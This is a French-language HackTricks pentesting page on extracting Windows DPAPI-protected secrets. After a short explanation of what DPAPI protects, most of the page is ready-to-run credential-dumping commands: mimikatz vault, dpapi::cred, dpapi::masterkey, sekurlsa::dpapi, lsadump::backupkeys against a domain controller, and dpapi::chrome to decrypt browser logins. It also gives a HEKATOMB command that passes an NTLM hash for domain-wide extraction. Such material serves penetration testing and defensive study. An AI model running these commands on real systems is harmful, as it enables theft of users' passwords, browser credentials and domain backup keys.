# DPAPI - Extraction de mots de passe

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

En créant ce post, mimikatz avait des problèmes avec chaque action qui interagissait avec DPAPI, donc **la plupart des exemples et des images ont été pris à partir de** : [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## Qu'est-ce que DPAPI

Son utilisation principale dans le système d'exploitation Windows est de **réaliser le chiffrement symétrique des clés privées asymétriques**, en utilisant un secret utilisateur ou système comme contribution significative d'entropie.\
**DPAPI permet aux développeurs de chiffrer des clés en utilisant une clé symétrique dérivée des secrets de connexion de l'utilisateur**, ou dans le cas du chiffrement système, en utilisant les secrets d'authentification de domaine du système.

Cela rend très facile pour le développeur de **sauvegarder des données chiffrées** dans l'ordinateur **sans** avoir besoin de **se soucier** de **protéger** la **clé de chiffrement**.

### Que protège DPAPI ?

DPAPI est utilisé pour protéger les données personnelles suivantes :

* Mots de passe et données de saisie semi-automatique de formulaires dans Internet Explorer, Google \*Chrome
* Mots de passe de compte de messagerie dans Outlook, Windows Mail, Windows Mail, etc.
* Mots de passe de compte de gestionnaire FTP interne
* Mots de passe d'accès aux dossiers et aux ressources partagées
* Clés de compte et mots de passe de réseau sans fil
* Clé de chiffrement dans Windows CardSpace et Windows Vault
* Mots de passe de connexion à distance, .NET Passport
* Clés privées pour le système de fichiers chiffré (EFS), le chiffrement de courrier S-MIME, les certificats d'autres utilisateurs, SSL/TLS dans les services d'information Internet
* EAP/TLS et 802.1x (authentification VPN et WiFi)
* Mots de passe réseau dans le Gestionnaire d'informations d'identification
* Données personnelles dans toute application protégée de manière programmable avec la fonction d'API CryptProtectData. Par exemple, dans Skype, les services de gestion des droits Windows, Windows Media, MSN messenger, Google Talk, etc.
* ...

{% hint style="info" %}
Un exemple de manière réussie et intelligente de protéger les données en utilisant DPAPI est la mise en œuvre de l'algorithme de chiffrement de mot de passe de saisie semi-automatique dans Internet Explorer. Pour chiffrer le nom d'utilisateur et le mot de passe pour une certaine page web, il appelle la fonction CryptProtectData, où dans le paramètre d'entropie facultatif, il spécifie l'adresse de la page web. Ainsi, à moins de connaître l'URL d'origine où le mot de passe a été saisi, personne, pas même Internet Explorer lui-même, ne peut décrypter ces données.
{% endhint %}

## Liste Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Fichiers d'identification

Les **fichiers d'identification protégés par le mot de passe principal** peuvent être situés dans:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Obtenez les informations d'identification en utilisant `dpapi::cred` de mimikatz, dans la réponse, vous pouvez trouver des informations intéressantes telles que les données chiffrées et le guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Vous pouvez utiliser le module **mimikatz** `dpapi::cred` avec le `/masterkey` approprié pour décrypter :
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Clés maîtresses

Les clés DPAPI utilisées pour chiffrer les clés RSA de l'utilisateur sont stockées dans le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où {SID} est l'**identificateur de sécurité** de cet utilisateur. **La clé DPAPI est stockée dans le même fichier que la clé maîtresse qui protège les clés privées de l'utilisateur**. Elle est généralement constituée de 64 octets de données aléatoires. (Remarquez que ce répertoire est protégé, vous ne pouvez donc pas le lister en utilisant `dir` depuis le cmd, mais vous pouvez le lister depuis PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Voici à quoi ressemblera un ensemble de clés maîtresses d'un utilisateur :

![](<../../.gitbook/assets/image (324).png>)

En général, **chaque clé maîtresse est une clé symétrique chiffrée qui peut décrypter d'autres contenus**. Par conséquent, **extraire** la **clé maîtresse chiffrée** est intéressant pour **décrypter** plus tard ce **contenu crypté** avec elle.

### Extraire la clé maîtresse et la décrypter

Dans la section précédente, nous avons trouvé le guidMasterKey qui ressemblait à `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, ce fichier sera à l'intérieur de :
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
```
Pour extraire la clé principale avec mimikatz:
```bash
# If you know the users password
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected

# If you don't have the users password and inside an AD
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
```
La clé maître du fichier apparaîtra dans la sortie.

Enfin, vous pouvez utiliser cette **clé maître** pour **décrypter** le **fichier de crédential** :
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```
### Extraire toutes les clés maîtresses locales avec un compte Administrateur

Si vous êtes administrateur, vous pouvez obtenir les clés maîtresses dpapi en utilisant :
```
sekurlsa::dpapi
```
![](<../../.gitbook/assets/image (326).png>)

### Extraire toutes les clés maîtresses de sauvegarde avec un compte Domain Admin

Un compte Domain Admin peut obtenir les clés maîtresses de sauvegarde dpapi qui peuvent être utilisées pour décrypter les clés chiffrées :
```
lsadump::backupkeys /system:dc01.offense.local /export
```
À l'aide de la clé de sauvegarde récupérée, décryptons la clé maître de l'utilisateur `spotless` :
```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
Nous pouvons maintenant décrypter les secrets Chrome de l'utilisateur `spotless` en utilisant leur clé maître décryptée :
```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
## Chiffrement et déchiffrement de contenu

Vous pouvez trouver un exemple de chiffrement et de déchiffrement de données avec DPAPI en utilisant Mimikatz et C++ dans [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
Vous pouvez trouver un exemple de chiffrement et de déchiffrement de données avec DPAPI en utilisant C# dans [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) est un portage C# de certaines fonctionnalités DPAPI du projet [Mimikatz](https://github.com/gentilkiwi/mimikatz/) de [@gentilkiwi](https://twitter.com/gentilkiwi).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) est un outil qui automatise l'extraction de tous les utilisateurs et ordinateurs du répertoire LDAP et l'extraction de la clé de sauvegarde du contrôleur de domaine via RPC. Le script résoudra ensuite toutes les adresses IP des ordinateurs et effectuera un smbclient sur tous les ordinateurs pour récupérer tous les blobs DPAPI de tous les utilisateurs et tout déchiffrer avec la clé de sauvegarde de domaine.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Avec la liste des ordinateurs extraits du répertoire LDAP, vous pouvez trouver tous les sous-réseaux même si vous ne les connaissiez pas !

"Parce que les droits d'administrateur de domaine ne suffisent pas. Hackez-les tous."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) peut extraire automatiquement les secrets protégés par DPAPI.

## Références

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
